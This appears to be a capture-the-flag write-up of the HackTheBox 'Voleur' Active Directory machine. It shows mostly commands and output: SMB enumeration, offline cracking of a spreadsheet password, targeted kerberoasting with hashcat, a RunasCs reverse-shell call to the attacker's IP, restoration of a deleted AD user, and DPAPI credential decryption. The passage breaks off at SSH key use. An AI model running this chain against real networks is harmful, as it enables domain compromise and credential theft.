# Nmap

```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ nmap -sC -sV -Pn 10.10.11.76 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 02:25 AEST
Nmap scan report for 10.10.11.76
Host is up (0.29s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-13 14:26:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-13T14:26:57
|_  start_date: N/A
|_clock-skew: -1h59m46s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.09 seconds

```

Add `dc.voleur.htb` to `/etc/hosts`

And also, we have the credit of `ryan.naylor`
```
Machine Information

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt
```
# Bloodhound by ryan.naylor
Firstly, I would check the smb service
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ smbmap -H 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt   

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.10.11.76, no fun for you...                                                                          
[*] Closed 1 connections          
```

Password authentication cannot be used directly, so request a ticket here
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ sudo ntpdate dc.voleur.htb                               
2025-07-14 00:36:46.986928 (+1000) +5.957544 +/- 0.140577 dc.voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 5.957544
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ export KRB5CCNAME=/home/kali/Voleur/ryan.naylor.ccache

┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ rm -f /home/wither/.nxc/workspaces/default/ldap.db
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
[*] Initializing LDAP protocol database
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 

```

Let's bloodhound it and check what next
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns 10.10.11.76 -c All -d voleur.htb --zip


INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 01M 07S
INFO: Compressing output into 20250714003948_bloodhound.zip

```

![](images/Pasted%20image%2020250714004825.png)
Found that I belong to a special group and have no direct power

# SMB
Let's come back to the smb service
```
NetExec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares --smb-timeout 500

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 

```

There is `IT` directory could be accessed
```
impacket-smbclient -k dc.voleur.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Fri Jul 11 04:06:16 2025 ..
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
# 

```

We can not open it because it needs the password
![](images/Pasted%20image%2020250714012943.png)

Let's crack it by john
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ office2john Access_Review.xlsx > access.hash

┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ john access.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 ASIMD 4x / SHA512 128/128 ASIMD 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:06 DONE (2025-07-14 01:39) 0.1455g/s 114.1p/s 114.1c/s 114.1C/s football1..lolita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Then we can get the information from that
![](images/Pasted%20image%2020250714013955.png)
We can get the the credits
```
svc_ldap  M1XyC9pW7qT5Vn
svc_iis   N5pXyV1WqM7CZ8
```
Come back to our bloodhound, we found `svc_ldap` can `GenericWrite` to the `lacey` user
![](images/Pasted%20image%2020250714014314.png)

And have `WriteSPN` permission for `svc_winrm`, then get the ticket
![](images/Pasted%20image%2020250714014649.png)

```
impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'                                                                                      ⏎
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
 
export KRB5CCNAME=svc_ldap.ccache   

```

Then let's start `targetedkerberoast`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ python3 /opt/targetedKerberoast/targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$2635e7e1602ea6c3aee000b775f479bb$9d5f328446c31ed60ed76687e223d532fc921689bfd12a499af3a39995745b2230a8a303a6cb81533d962dc39448d363b7303ee6bc6ef66355a15def1e149b423d01fa7917b992a29bb14ea01f81c5be3c54a5e2d898028a6f0d10737e7b09e84e41ab430b65b2d9805d784481fe94e990d3b5653a44b2e9ed1431e3442d1eabfd70faf058f998f0f22322348e5f641f5444b8007769b0c4b8f8f65f0926762de7c4675b80f101e72e049952b4fb4373a424aed797cff8b06c1b03e84b484362fdfb8a987b3bf70451347de648d1db51c97b82e08c00a15ffbd9ebc2e379aa8de357c3cc967f2e8900b52f67e41d9e1c7b7ad894b3a9ba3c55f036f8b38aba54aa2a71d688892caee79737f57df7bf5138a5438f38e60d617e2af30f57355514d66c5bea33e342e4fac13fb1e7fadf3c87e4962bf5425c84ed420a1580c5fc4f02fd835f4bc31fe49ecf59abbd81cde58852a1ec775f6679e0669a0b17e1f5aa13504a8919a18b863127ea6b8fc5d46c1630f0aa66ab31670f1e6064c6dd7d1c20a04ec1c48b00b60a78603d9b6de51bb292242f98c0d4ae59e7ab18689f76f2d23d5bfc52813bd07a353d1effa1bd74a25ae79798444820f14d17d60c68c0001a2661616fa26565aa1aba7d21445c2d5a5119e63221bd6a3e530747eb3e72199cf2f51f0c2766d59bc323266f2e389eca8bb7a6b24de5af81381005697432a081f2511156557d2d4c7fd7f42f0274e76d837e60fc7d1696627bf899edbe20f1d60e98cca1daa2b46edd5cce1128322d2ace7833b959795fb5f61dd87d96f074697e17007941b3056aa8f3902816a8f522c150207eec2cce152f685ebed3490b9b2d079a5671038bd9375c9e579a60ce66e6c8f1e34df67522bb7b4ebe3ad33671d1bfde4ea6f74eac7e4ef02a6d00b0a91c86f2515e57b6dccb5df83e70be289761afc6e1b335b6bf8f64bc189be7851f254b39e89303d01de98a889fa87ba46393fdb22b03940c5803a7309c77cca1e483c1be660bd0c5c5e47cc6316e727ed91582c44636d5f3ddd67cb92e0db9605d8596a27e1cb866a6f41a073036b7520cdaf3c9f8c9c18402533f80cd2180a183741828761eb4528e666c5a452d941e60d46484b1f490c103feb728808e0c4d78821679fead01a8c6af58fa10913cdef01ba6eee2ffc9dab08f4d96b7461b7013cf651a8da8323b5d128705d079e94418ecbe4a2b4122a4701d2d333704188c2a6378091ed43a5c529ed491195c8acef80805ea5a5003d04cb5de9f862a25304ecf4c6a6ab88910d61a94def6e427b074ecfffde13f962fb27c68ba8ce1e33a94844eea7ba629ad9aff471a691f758929d714d6737542c9012634542cd4d0854929b5ad15f127f9213660120969f261466564ebaf78372190a832f6a7ebe119de64bceb04bfad8455a636538de866edf738a0245b668a67505532c7dfaafc74c0e3d2
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$c34760757d5f9ec68cd86c8eba5f6fd4$525e7d9a3e813067e0920261c81a820b1376c48cd18bb7b9b6289bde4c74b78d24a5f4a419c477e43d0a2fff6cc183c649f7e77567a352ea27fad8d163a5ec010bc06517188ef33a0611821f6b540ec224ad3abc60023120d68f367c2726db650ae12d0792184dcfa0dd2bb3dc508d8d865f2f25d9dd595b804d5797e023ea5c2c6da594a3a79f5b920209811f7fe6b1501a3fc15893e96e268bcb2a500786abe5a5d560cf4ce2d600215623c9b71c9a8068f792b22970991b550614e1fbba6b0b735f5d65632520c3649f6b9c5227b5751198fe865182f7341bacd0c0ed5c7485cdd1c0ff7db1f9b8c223b61ba9d4d49a9807396e79b9f25f05d80fc14ed6e0bc7c88154e6d5882dd773859cd7558e38fdc1a042e08ac45c08546615516079aa35a0b90211e6fd0c75ad7c104e3322a043f27ddcf43bd3bf99a48feddb1a0031bd5b6b92b3873b3b997f8b87fc368ce865b5388deaca7c12378ca0617e210450f57678a77979325b2f3e7a9c7f4d8e0ee30a2d28445b30bcaa34b6fc1174ea4a1e8c380992f613ac6dc6e83b2e611a0144f80276f8833f6909235bd8d285f276a4dc8507f52555426e928f1b979b468815600d92f4c05bb32caa87b3d9e2185cbf516a76fd594e4c45fb9aeab8b2f4468e4df4d588386e46a91230b686c5767dd3a44e01eb385892a1cfc18387fe17d3d035aa938071d7f4a9a962c248ac06175df4f4bae24c161b4ab8a3f408b1028ecb336dcd145304188a09c6d87447a67ab426144f879b17bb7835babb1627f6a65374c2946e2c63e2e7a9d327d1ef55719b83092161598fee9dbd56226214fc27991cd06c125d80d5a22d96420cce24299691ec3b3f110a95a877caaef7634e26c133205c329557153dcb2344e45fb90ef08cf79d9e8306ffe2eac2fe8527fd835b7a0dec07e049670c5582b392b3c87d76e91162d83e6842fcbbda3cb0c66e163516b9e7f6d29bd6d61f121f6f4ee284379748ceb6bc9f3d346ff2bb6b8a7d8e3870c5004371da8220665a27e3efc78bfc9d6bca4de349d7868d97e124a0fa76533c9abe298b444aa90d463bef90bc59075c480f04b79c2e5abe778d27a1d0a47cb94f3239a947cd659a201bee5232c14449c09e302b038ecf475cf36118c43d23648ee2c516405c548ad0d6732552818f974b836080326f6ce47c8f7ba7009e6c57b5a3ce02f91a79d9ef4f7d6815404ca4a082bba2c44fc12f29658d9eccb57506b18463ad09287ffd426e5431c51ab78af2207b7f55763773b6e797092968ef0d439e4b32a166097d85e4fa923bdf0b32aa8bccae5ce791f0638066014355f4c7eed9d58f588583ea9e30b95d180a43140dfc5c1f328f83f070227ef7d06ee047e81401cddf73a4a7c7ceca516e1ede1e0e3010d95328cd3d79afd01009f3ef95840ee6cda10340e28576cf364b4f6e48a92e208af631ae5bce85703cc3aa02854

```

Then we can crack them by `hashcat`
```
hashcat svc_winrm.hash /usr/share/wordlists/rockyou.txt -m 13100

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$c34760757d5f9ec68cd86c8eba5f6fd4$525e7d9a3e813067e0920261c81a820b1376c48cd18bb7b9b6289bde4c74b78d24a5f4a419c477e43d0a2fff6cc183c649f7e77567a352ea27fad8d163a5ec010bc06517188ef33a0611821f6b540ec224ad3abc60023120d68f367c2726db650ae12d0792184dcfa0dd2bb3dc508d8d865f2f25d9dd595b804d5797e023ea5c2c6da594a3a79f5b920209811f7fe6b1501a3fc15893e96e268bcb2a500786abe5a5d560cf4ce2d600215623c9b71c9a8068f792b22970991b550614e1fbba6b0b735f5d65632520c3649f6b9c5227b5751198fe865182f7341bacd0c0ed5c7485cdd1c0ff7db1f9b8c223b61ba9d4d49a9807396e79b9f25f05d80fc14ed6e0bc7c88154e6d5882dd773859cd7558e38fdc1a042e08ac45c08546615516079aa35a0b90211e6fd0c75ad7c104e3322a043f27ddcf43bd3bf99a48feddb1a0031bd5b6b92b3873b3b997f8b87fc368ce865b5388deaca7c12378ca0617e210450f57678a77979325b2f3e7a9c7f4d8e0ee30a2d28445b30bcaa34b6fc1174ea4a1e8c380992f613ac6dc6e83b2e611a0144f80276f8833f6909235bd8d285f276a4dc8507f52555426e928f1b979b468815600d92f4c05bb32caa87b3d9e2185cbf516a76fd594e4c45fb9aeab8b2f4468e4df4d588386e46a91230b686c5767dd3a44e01eb385892a1cfc18387fe17d3d035aa938071d7f4a9a962c248ac06175df4f4bae24c161b4ab8a3f408b1028ecb336dcd145304188a09c6d87447a67ab426144f879b17bb7835babb1627f6a65374c2946e2c63e2e7a9d327d1ef55719b83092161598fee9dbd56226214fc27991cd06c125d80d5a22d96420cce24299691ec3b3f110a95a877caaef7634e26c133205c329557153dcb2344e45fb90ef08cf79d9e8306ffe2eac2fe8527fd835b7a0dec07e049670c5582b392b3c87d76e91162d83e6842fcbbda3cb0c66e163516b9e7f6d29bd6d61f121f6f4ee284379748ceb6bc9f3d346ff2bb6b8a7d8e3870c5004371da8220665a27e3efc78bfc9d6bca4de349d7868d97e124a0fa76533c9abe298b444aa90d463bef90bc59075c480f04b79c2e5abe778d27a1d0a47cb94f3239a947cd659a201bee5232c14449c09e302b038ecf475cf36118c43d23648ee2c516405c548ad0d6732552818f974b836080326f6ce47c8f7ba7009e6c57b5a3ce02f91a79d9ef4f7d6815404ca4a082bba2c44fc12f29658d9eccb57506b18463ad09287ffd426e5431c51ab78af2207b7f55763773b6e797092968ef0d439e4b32a166097d85e4fa923bdf0b32aa8bccae5ce791f0638066014355f4c7eed9d58f588583ea9e30b95d180a43140dfc5c1f328f83f070227ef7d06ee047e81401cddf73a4a7c7ceca516e1ede1e0e3010d95328cd3d79afd01009f3ef95840ee6cda10340e28576cf364b4f6e48a92e208af631ae5bce85703cc3aa02854:AFireInsidedeOzarctica980219afi
```

We can successfully crack the password of `svc_winrm:AFireInsidedeOzarctica980219afi` 
But we can not crack the hash of `lancy`

# shell as svc_winrm
Then let's try to get the ticket again and connect it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ export KRB5CCNAME=svc_winrm.ccache  

┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ evil-winrm -i dc.voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -r voleur.htb

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
```

If you get the error message
```
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Cannot find KDC for realm "VOLEUR.HTB"

                                        
Error: Exiting with code 1

```
Please change your `/etc/krb5.conf`
```
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VOLEUR.HTB

[realms]
    VOLEUR.HTB = {
        kdc = dc.VOLEUR.HTB
        admin_server = dc.VOLEUR.HTB
        default_domain = VOLEUR.HTB
    }

[domain_realm]
    .VOLEUR.HTB = VOLEUR.HTB
    VOLEUR.HTB = VOLEUR.HTB
```

# Restore Todd.Wolfe
The current user is not important. Note that `svc_ldap` belongs to the `RESTORE_USERS` group, so the `Todd` user mentioned earlier may be useful.
Let's upload the `RunasCs` to switch to the shell as `svc_ldap`
```
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload ../../../../../opt/RunasCs.exe
                                        
Info: Uploading /home/wither/Templates/htb-labs/Voleur/../../../../../opt/RunasCs.exe to C:\Users\svc_winrm\Desktop\RunasCs.exe
                                        
Info: Upload successful!


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.16:443
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1e5b550$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1632 created in background.

```

Then let's check the deleted account
```
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db

```

Then try to restore Todd
```
Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects |
    Restore-ADObject
```

Then we can get the ticket of `todd`
```
impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'
export KRB5CCNAME=todd.wolfe.ccache
```

# DPAPI

I found that Todd belonged to the `SECOND LINE TECHNICIANS` group, and then returned to SMB
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$  impacket-smbclient -k dc.voleur.htb 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
drw-rw-rw-          0  Tue Jul  1 07:08:33 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 Archived Users
# cd Archived Users
# dir
*** Unknown syntax: dir
# ls
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 .
drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:16 2025 todd.wolfe
# cd todd.wolfe
# dir
*** Unknown syntax: dir
# ls
drw-rw-rw-          0  Thu Jan 30 02:13:16 2025 .
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 3D Objects
drw-rw-rw-          0  Thu Jan 30 02:13:09 2025 AppData
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Contacts
drw-rw-rw-          0  Fri Jan 31 01:28:50 2025 Desktop
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Documents
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Downloads
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Favorites
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Links
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Music
-rw-rw-rw-      65536  Thu Jan 30 02:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 23:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 23:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 23:53:07 2025 ntuser.ini
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Pictures
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Saved Games
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Searches
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Videos
# cd Desktop
# ls
drw-rw-rw-          0  Fri Jan 31 01:28:50 2025 .
drw-rw-rw-          0  Thu Jan 30 02:13:16 2025 ..
-rw-rw-rw-        282  Wed Jan 29 23:53:09 2025 desktop.ini
-rw-rw-rw-       2312  Wed Jan 29 23:53:10 2025 Microsoft Edge.lnk
```

We need to try to get `dpapi` encrypted data and keys
```
get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88

get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3

```
Then let's Crack the key and user credit
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

```

# Bloodhound by jeremy.combs
Let's continue to get the ticket of `jeremy.combs`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ export KRB5CCNAME=jeremy.combs.ccache 
```

Then let's continue to bloodhound it
```
bloodhound-python -u jeremy.combs -p qT3V9pLXyN7W4m -k -ns 10.10.11.76 -c All -d voleur.htb --zip
```
![](images/Pasted%20image%2020250714025320.png)
But these two groups do not have interesting connection to DC

Let's try to get the shell as `jeremy.combs`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-smbclient -k dc.voleur.htb 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
drw-rw-rw-          0  Tue Jul  1 07:08:33 2025 ..
drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
-rw-rw-rw-       2602  Fri Jan 31 03:11:29 2025 id_rsa
-rw-rw-rw-        186  Fri Jan 31 03:07:35 2025 Note.txt.txt
# get id_rsa
# get Note.txt.txt

```
There is another note file here
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ cat Note.txt.txt 
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin       
```
Check that the key belongs to the svc_backup user, and the port 2222 was opened by the previous port scan. Try to connect
```
ssh-keygen -y -f ./id_rsa
